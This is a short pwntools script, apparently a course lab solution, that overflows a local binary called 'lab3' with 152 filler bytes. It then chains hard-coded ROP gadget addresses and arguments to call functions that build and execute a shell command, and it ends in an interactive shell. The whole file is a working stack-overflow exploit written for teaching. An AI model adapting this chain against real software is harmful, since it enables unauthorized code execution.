#!/usr/bin/python

from pwn import *

def main():
        #start a process
        p = process("./lab3")

        #create payload
        #Please put your payload here
        arg1 = 0xff424242
        arg2 = 0xffff4141
        add_bin = 0x080491b6
        exec_str = 0x08049182
        pop_ret = 0x0804933b
        add_bash = 0x0804920f
        pop_pop_ret = 0x0804933a
        pop_pop_pop_ret = 0x08049339

        payload = b"A" * 152 + p32(add_bin)
        payload += p32(pop_pop_pop_ret)
        payload += p32(arg1)
        payload += p32(arg2)
        payload += p32(0xdeadbeef)
        payload += p32(add_bash)
        payload += p32(pop_pop_ret)
        payload += p32(0xcafebabe)
        payload += p32(0xffffffff)
        payload += p32(exec_str)
        payload += p32(pop_ret)
        payload += p32(0xabcdabcd)

        #send the payload to the binary
        p.send(payload)

        #pass interaction back to the user
        p.interactive()

if __name__ == "__main__":
        main()
